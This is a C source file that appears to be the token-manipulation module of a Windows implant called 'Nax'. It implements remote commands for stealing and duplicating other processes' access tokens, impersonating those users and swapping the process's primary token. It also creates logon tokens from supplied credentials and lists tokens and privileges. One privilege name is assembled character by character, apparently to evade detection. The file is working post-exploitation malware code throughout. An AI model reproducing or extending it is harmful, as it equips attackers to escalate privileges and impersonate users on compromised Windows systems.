#include "Macros.h"
#include "Instance.h"
#include "Common.h"

/* ========= [ forward declarations (Packer.c) ] ========= */

FUNC VOID   NaxW16( PBYTE p, UINT16 v );
FUNC VOID   NaxW32( PBYTE p, UINT32 v );
FUNC UINT32 NaxR32( const PBYTE p );

/* ========= [ helpers ] ========= */

static UINT32 NaxTokenNextId( PNAX_INSTANCE Nax ) {
    UINT32 id = 1;
    for ( ;; id++ ) {
        NAX_TOKEN_NODE* cur = Nax->TokenHead;
        BOOL found = FALSE;
        while ( cur ) {
            if ( cur->TokenId == id ) { found = TRUE; break; }
            cur = cur->Next;
        }
        if ( !found ) return id;
    }
}

static BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, DWORD* userLen, PCHAR domain, DWORD* domainLen ) {
    if ( !hToken || !Nax->Advapi32.GetTokenInformation || !Nax->Advapi32.LookupAccountSidA )
        return FALSE;

    DWORD tokenInfoSize = 0;
    Nax->Advapi32.GetTokenInformation( hToken, TokenUser, NULL, 0, &tokenInfoSize );
    if ( tokenInfoSize == 0 ) return FALSE;

    PVOID tokenInfo = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, tokenInfoSize );
    if ( !tokenInfo ) return FALSE;

    BOOL result = FALSE;
    if ( Nax->Advapi32.GetTokenInformation( hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize ) ) {
        SID_NAME_USE sidType;
        result = Nax->Advapi32.LookupAccountSidA( NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, user, userLen, domain, domainLen, &sidType );
    }

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, tokenInfo );
    return result;
}

static NAX_TOKEN_NODE* NaxTokenAdd( PNAX_INSTANCE Nax, HANDLE hToken, UINT32 sourcePid ) {
    NAX_TOKEN_NODE* node = (NAX_TOKEN_NODE*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_TOKEN_NODE ) );
    if ( !node ) return NULL;
    MmZero( node, sizeof( NAX_TOKEN_NODE ) );

    node->Handle    = hToken;
    node->TokenId   = NaxTokenNextId( Nax );
    node->SourcePid = sourcePid;
    node->Next      = NULL;

    DWORD userLen   = sizeof( node->User ) - 1;
    DWORD domainLen = sizeof( node->Domain ) - 1;
    NaxTokenResolveUser( Nax, hToken, node->User, &userLen, node->Domain, &domainLen );

    if ( !Nax->TokenHead ) {
        Nax->TokenHead = node;
    } else {
        NAX_TOKEN_NODE* tail = Nax->TokenHead;
        while ( tail->Next ) tail = tail->Next;
        tail->Next = node;
    }

    return node;
}

static NAX_TOKEN_NODE* NaxTokenFindById( PNAX_INSTANCE Nax, UINT32 tokenId ) {
    NAX_TOKEN_NODE* cur = Nax->TokenHead;
    while ( cur ) {
        if ( cur->TokenId == tokenId ) return cur;
        cur = cur->Next;
    }
    return NULL;
}

static BOOL NaxTokenRemove( PNAX_INSTANCE Nax, UINT32 tokenId ) {
    NAX_TOKEN_NODE* cur  = Nax->TokenHead;
    NAX_TOKEN_NODE* prev = NULL;

    while ( cur ) {
        if ( cur->TokenId == tokenId ) {
            if ( prev ) prev->Next = cur->Next;
            else        Nax->TokenHead = cur->Next;
            if ( cur->Handle ) Nax->Ntdll.NtClose( cur->Handle );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cur );
            return TRUE;
        }
        prev = cur;
        cur  = cur->Next;
    }
    return FALSE;
}

/* Write a length-prefixed string: len(2LE) + bytes. Returns bytes written. */
static UINT32 WriteLenStr( PBYTE p, const PCHAR s ) {
    UINT32 len = 0;
    if ( s ) { PCHAR t = (PCHAR)s; while ( *t ) { len++; t++; } }
    NaxW16( p, (UINT16)len );
    if ( len > 0 ) MmCopy( p + 2, s, len );
    return 2 + len;
}

static BOOL NaxEnablePrivilege( PNAX_INSTANCE Nax, const CHAR* privName ) {
    if ( !Nax->Advapi32.LookupPrivilegeValueA || !Nax->Advapi32.AdjustTokenPrivileges )
        return FALSE;

    HANDLE hToken = NULL;
    if ( !NT_SUCCESS( Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) || !hToken )
        return FALSE;

    LUID luid;
    MmZero( &luid, sizeof( luid ) );
    if ( !Nax->Advapi32.LookupPrivilegeValueA( NULL, privName, &luid ) ) {
        Nax->Ntdll.NtClose( hToken );
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = Nax->Advapi32.AdjustTokenPrivileges( hToken, FALSE, &tp, 0, NULL, NULL );
    Nax->Ntdll.NtClose( hToken );
    return ok;
}

/* ========= [ CMD_TOKEN_GETUID (0x50) ] ========= */

FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    HANDLE hToken = NULL;

    if ( Nax->Advapi32.OpenThreadToken )
        Nax->Advapi32.OpenThreadToken( (HANDLE)(LONG_PTR)-2, TOKEN_QUERY, TRUE, &hToken );

    if ( !hToken )
        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken );

    if ( !hToken ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    CHAR user[128]; MmZero( user, sizeof( user ) );
    CHAR domain[128]; MmZero( domain, sizeof( domain ) );
    DWORD userLen   = sizeof( user ) - 1;
    DWORD domainLen = sizeof( domain ) - 1;

    if ( !NaxTokenResolveUser( Nax, hToken, user, &userLen, domain, &domainLen ) ) {
        Nax->Ntdll.NtClose( hToken );
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    struct { DWORD TokenIsElevated; } elev;
    DWORD elevSize = sizeof( elev );
    BYTE elevated = 0;
    if ( Nax->Advapi32.GetTokenInformation( hToken, (TOKEN_INFORMATION_CLASS)20, &elev, sizeof( elev ), &elevSize ) )
        elevated = elev.TokenIsElevated ? 1 : 0;

    Nax->Ntdll.NtClose( hToken );

    UINT32 pos = 0;
    pos += WriteLenStr( out + pos, user );
    pos += WriteLenStr( out + pos, domain );
    out[pos++] = elevated;
    *out_len = pos;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_STEAL (0x51) ] ========= */

FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 5 ) return NAX_ERR_INVAL;

    UINT32 pid         = NaxR32( args );
    BYTE   impersonate = args[4];

    OBJECT_ATTRIBUTES oa;
    MmZero( &oa, sizeof( oa ) );
    oa.Length = sizeof( OBJECT_ATTRIBUTES );

    CLIENT_ID cid;
    MmZero( &cid, sizeof( cid ) );
    cid.UniqueProcess = (HANDLE)(UINT_PTR)pid;

    HANDLE hProcess = NULL;
    NTSTATUS ns = Nax->Ntdll.NtOpenProcess( &hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid );
    if ( !NT_SUCCESS( ns ) ) {
        ns = Nax->Ntdll.NtOpenProcess( &hProcess, PROCESS_QUERY_INFORMATION, &oa, &cid );
        if ( !NT_SUCCESS( ns ) ) {
            NaxWriteWin32Err( out, out_len );
            return NAX_ERR_FAIL;
        }
    }

    HANDLE hToken = NULL;
    ns = Nax->Ntdll.NtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken );
    Nax->Ntdll.NtClose( hProcess );

    if ( !NT_SUCCESS( ns ) || !hToken ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    HANDLE hDup  = NULL;
    BOOL   duped = FALSE;
    if ( Nax->Advapi32.DuplicateTokenEx ) {
        duped = Nax->Advapi32.DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDup );
    }

    if ( duped && hDup ) {
        Nax->Ntdll.NtClose( hToken );
        hToken = hDup;
    }

    NAX_TOKEN_NODE* node = NaxTokenAdd( Nax, hToken, pid );
    if ( !node ) {
        Nax->Ntdll.NtClose( hToken );
        return NAX_ERR_NOMEM;
    }

    if ( impersonate ) {
        if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
            Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );

        CHAR pn[30];
        pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
        pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
        pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
        pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
        NaxEnablePrivilege( Nax, pn );

        if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
            HANDLE hPrimary = NULL;
            if ( Nax->Advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
                struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
                Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
                Nax->Ntdll.NtClose( hPrimary );
            }
        }

        if ( Nax->Advapi32.ImpersonateLoggedOnUser )
            Nax->Advapi32.ImpersonateLoggedOnUser( hToken );

        Nax->ActiveToken = hToken;
    }

    UINT32 pos = 0;
    NaxW32( out + pos, node->TokenId ); pos += 4;
    pos += WriteLenStr( out + pos, node->User );
    pos += WriteLenStr( out + pos, node->Domain );
    out[pos++] = impersonate;
    *out_len = pos;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_USE (0x52) ] ========= */

FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 4 ) return NAX_ERR_INVAL;

    UINT32 tokenId = NaxR32( args );
    NAX_TOKEN_NODE* node = NaxTokenFindById( Nax, tokenId );
    if ( !node ) {
        *out_len = 0;
        return NAX_ERR_FAIL;
    }

    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );

    CHAR pn[30];
    pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
    pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
    pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
    pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
    NaxEnablePrivilege( Nax, pn );

    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
        HANDLE hPrimary = NULL;
        if ( Nax->Advapi32.DuplicateTokenEx( node->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
            Nax->Ntdll.NtClose( hPrimary );
        }
    }

    if ( !Nax->Advapi32.ImpersonateLoggedOnUser || !Nax->Advapi32.ImpersonateLoggedOnUser( node->Handle ) ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    Nax->ActiveToken = node->Handle;

    UINT32 pos = 0;
    pos += WriteLenStr( out + pos, node->User );
    pos += WriteLenStr( out + pos, node->Domain );
    *out_len = pos;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_LIST (0x53) ] ========= */

FUNC INT CmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    UINT32 cap   = *out_len;
    UINT32 pos   = 4;
    UINT32 count = 0;

    NAX_TOKEN_NODE* cur = Nax->TokenHead;
    while ( cur && pos + 12 < cap ) {
        NaxW32( out + pos, cur->TokenId );   pos += 4;
        NaxW32( out + pos, cur->SourcePid ); pos += 4;
        pos += WriteLenStr( out + pos, cur->User );
        pos += WriteLenStr( out + pos, cur->Domain );
        count++;
        cur = cur->Next;
    }

    NaxW32( out, count );
    *out_len = pos;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_RM (0x54) ] ========= */

FUNC INT CmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 4 ) return NAX_ERR_INVAL;

    UINT32 tokenId = NaxR32( args );
    if ( !NaxTokenRemove( Nax, tokenId ) ) {
        *out_len = 0;
        return NAX_ERR_FAIL;
    }

    Nax->ActiveToken = NULL;
    *out_len = 0;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_REVERT (0x55) ] ========= */

FUNC INT CmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    if ( !Nax->Advapi32.RevertToSelf || !Nax->Advapi32.RevertToSelf() ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    if ( Nax->OriginalPrimaryToken && Nax->Ntdll.NtSetInformationProcess ) {
        struct { HANDLE Token; HANDLE Thread; } pat = { Nax->OriginalPrimaryToken, NULL };
        Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
        Nax->Ntdll.NtClose( Nax->OriginalPrimaryToken );
        Nax->OriginalPrimaryToken = NULL;
    }

    Nax->ActiveToken = NULL;
    *out_len = 0;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_MAKE (0x56) ] ========= */

FUNC INT CmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 16 || !Nax->Advapi32.LogonUserA ) return NAX_ERR_INVAL;

    UINT32 off = 0;
    DWORD logonType = NaxR32( args + off ); off += 4;

    UINT32 domainLen = NaxR32( args + off ); off += 4;
    if ( off + domainLen > args_len ) return NAX_ERR_INVAL;
    PCHAR domainRaw = (PCHAR)( args + off ); off += domainLen;

    if ( off + 4 > args_len ) return NAX_ERR_INVAL;
    UINT32 userLen = NaxR32( args + off ); off += 4;
    if ( off + userLen > args_len ) return NAX_ERR_INVAL;
    PCHAR userRaw = (PCHAR)( args + off ); off += userLen;

    if ( off + 4 > args_len ) return NAX_ERR_INVAL;
    UINT32 passLen = NaxR32( args + off ); off += 4;
    if ( off + passLen > args_len ) return NAX_ERR_INVAL;
    PCHAR passRaw = (PCHAR)( args + off );

    PCHAR domain   = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, domainLen + 1 );
    PCHAR user     = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, userLen + 1 );
    PCHAR password = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, passLen + 1 );
    if ( !domain || !user || !password ) {
        if ( domain )   Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, domain );
        if ( user )     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, user );
        if ( password ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, password );
        return NAX_ERR_NOMEM;
    }

    MmCopy( domain, domainRaw, domainLen ); domain[domainLen] = '\0';
    MmCopy( user, userRaw, userLen );       user[userLen]     = '\0';
    MmCopy( password, passRaw, passLen );   password[passLen] = '\0';

    HANDLE hToken = NULL;
    BOOL ok = Nax->Advapi32.LogonUserA( user, domain, password, logonType, LOGON32_PROVIDER_DEFAULT, &hToken );

    MmZero( password, passLen );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, password );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, user );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, domain );

    if ( !ok || !hToken ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    NAX_TOKEN_NODE* node = NaxTokenAdd( Nax, hToken, 0 );
    if ( !node ) {
        Nax->Ntdll.NtClose( hToken );
        return NAX_ERR_NOMEM;
    }

    UINT32 pos = 0;
    NaxW32( out + pos, node->TokenId ); pos += 4;
    pos += WriteLenStr( out + pos, node->User );
    pos += WriteLenStr( out + pos, node->Domain );
    *out_len = pos;
    return NAX_OK;
}

/* ========= [ CMD_TOKEN_PRIVS (0x57) ] ========= */

FUNC INT CmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    HANDLE hToken = NULL;

    if ( Nax->Advapi32.OpenThreadToken )
        Nax->Advapi32.OpenThreadToken( (HANDLE)(LONG_PTR)-2, TOKEN_QUERY, TRUE, &hToken );

    if ( !hToken )
        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken );

    if ( !hToken ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    DWORD tokenInfoSize = 0;
    Nax->Advapi32.GetTokenInformation( hToken, TokenPrivileges, NULL, 0, &tokenInfoSize );
    if ( tokenInfoSize == 0 ) {
        Nax->Ntdll.NtClose( hToken );
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    PVOID privBuf = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, tokenInfoSize );
    if ( !privBuf ) {
        Nax->Ntdll.NtClose( hToken );
        return NAX_ERR_NOMEM;
    }

    if ( !Nax->Advapi32.GetTokenInformation( hToken, TokenPrivileges, privBuf, tokenInfoSize, &tokenInfoSize ) ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, privBuf );
        Nax->Ntdll.NtClose( hToken );
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)privBuf;
    UINT32 cap   = *out_len;
    UINT32 pos   = 4;
    UINT32 count = 0;

    for ( DWORD i = 0; i < tp->PrivilegeCount && pos + 40 < cap; i++ ) {
        CHAR  name[64]; MmZero( name, sizeof( name ) );
        DWORD nameLen = sizeof( name ) - 1;

        if ( !Nax->Advapi32.LookupPrivilegeNameA || !Nax->Advapi32.LookupPrivilegeNameA( NULL, &tp->Privileges[i].Luid, name, &nameLen ) )
            continue;

        UINT32 slen = 0;
        while ( name[slen] ) slen++;

        NaxW16( out + pos, (UINT16)slen ); pos += 2;
        MmCopy( out + pos, name, slen );   pos += slen;
        NaxW32( out + pos, tp->Privileges[i].Attributes ); pos += 4;
        count++;
    }

    NaxW32( out, count );
    *out_len = pos;

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, privBuf );
    Nax->Ntdll.NtClose( hToken );
    return NAX_OK;
}
